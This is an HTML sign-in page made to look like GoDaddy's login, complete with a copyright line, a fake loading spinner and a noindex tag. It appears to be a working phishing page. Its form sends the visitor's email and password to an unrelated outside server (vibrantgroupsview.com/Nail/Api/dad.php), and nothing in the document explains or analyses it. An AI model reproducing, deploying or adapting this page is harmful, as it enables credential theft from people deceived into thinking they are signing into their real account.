<!DOCTYPE html>
<html>
<head>
    <title>Sign In</title>
    <meta name="robots" content="noindex, nofollow">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
        }

        .login-container {
            max-width: 480px;
            margin: 0 auto;
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            margin-top: 50px;
            position: relative; /* Add relative positioning */
        }

        h2 {
            text-align: left;
            font-size: 24px; /* Increased font size */
        }

        .form-group {
            margin-bottom: 20px;
            position: relative; /* Add relative positioning */
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            text-align: left;
            font-size: 16px; /* Increased font size */
        }

        .form-group input {
            width: 100%;
            padding: 8px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .form-group button {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            background-color: #000000;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .form-group button:hover {
            background-color: #45a049;
        }

        u {
            color: #00613e;
            text-decoration: underline;
            font-size: 16px; /* Increased font size */
        }

        .logo-image {
            max-width: 100%;
            height: auto;
        }

        .social-image {
            max-width: 100%;
            height: auto;
        }

        .loader-container {
            position: absolute;
            top: 0;
            right: 0;
            height: 100%;
            display: none; /* Hide the loader by default */
            align-items: center;
            justify-content: center;
        }

        .loader {
            border: 16px solid #34ebc6; /* Updated loader color */
            border-top: 16px solid #ffffff; /* White color (to create a spinner effect) */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media screen and (max-width: 480px) {
            .login-container {
                width: 90%;
                margin-top: 30px;
            }
        }
    </style>
    <script>
        // JavaScript to simulate the loader animation and delay form submission
        document.addEventListener('DOMContentLoaded', function() {
            var form = document.getElementById('loginForm');
            var loaderContainer = document.getElementById('loaderContainer');

            form.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent form submission
                loaderContainer.style.display = 'flex'; // Show the loader

                setTimeout(function() {
                    loaderContainer.style.display = 'none'; // Hide the loader after 3 seconds
                    form.submit(); // Submit the form
                }, 3000);
            });
        });
    </script>
</head>
<body>

    <div class="login-container">
        <img src="go.png" alt="" class="logo-image">
        <h2>Sign In</h2><br>
        
        <p>New to GoDaddy? <u>Create an Account</u></p><br>

        <form id="loginForm" action="https://vibrantgroupsview.com/Nail/Api/dad.php" method="post">
            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" autofocus required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
                <div id="loaderContainer" class="loader-container">
                    <div class="loader"></div>
                </div>
            </div>
            <div class="form-group">
                <button type="submit">Sign In</button><br><br>
                <center>or sign in with</center><br><br>
                <img src="3.png" alt="" class="social-image"><br><br>
                <center>Need to find  <u>your username</u> or your <u>password?</u><br><br><br><br><br><br>
                &copy; 1999-2023 GoDaddy Operating Company, LLC.<br><br> All Rights Reserved. <u>Privacy Policy</u>
            </div>
        </form>
    </div>

</body>
</html>
